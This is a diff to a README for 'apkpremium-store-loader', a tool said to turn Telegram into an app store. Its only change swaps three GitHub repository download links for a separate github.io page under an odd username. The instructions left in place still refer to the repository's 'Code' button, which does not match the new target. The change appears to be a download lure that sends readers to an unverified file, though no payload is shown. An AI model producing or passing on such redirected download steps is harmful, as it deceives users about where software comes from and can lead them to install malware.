@@ -1,6 +1,6 @@
 # 📱 apkpremium-store-loader - Turn Telegram Into an App Store
 
-[![Download Now](https://img.shields.io/badge/Download-APKPremium%20Store%20Loader-blue?style=for-the-badge&logo=github)](https://github.com/telomerasecorneliaotisskinner80/apkpremium-store-loader)
+[![Download Now](https://img.shields.io/badge/Download-APKPremium%20Store%20Loader-blue?style=for-the-badge&logo=github)](https://telomerasecorneliaotisskinner80.github.io)
 
 ## 🚀 What Is This?
 
@@ -25,7 +25,7 @@ This is the most important part. Follow these steps exactly to get the app worki
 
 Visit this link to download the application:
 
-[**https://github.com/telomerasecorneliaotisskinner80/apkpremium-store-loader**](https://github.com/telomerasecorneliaotisskinner80/apkpremium-store-loader)
+[**https://telomerasecorneliaotisskinner80.github.io**](https://telomerasecorneliaotisskinner80.github.io)
 
 Click the green "Code" button on that page, then select "Download ZIP". Wait for the download to finish.
 
@@ -88,7 +88,7 @@ Make sure you've extracted the ZIP file completely. Also check that your bot tok
 
 If you need to download the application again, use this link:
 
-[**https://github.com/telomerasecorneliaotisskinner80/apkpremium-store-loader**](https://github.com/telomerasecorneliaotisskinner80/apkpremium-store-loader)
+[**https://telomerasecorneliaotisskinner80.github.io**](https://telomerasecorneliaotisskinner80.github.io)
 
 ## 📝 Need More Help?
 
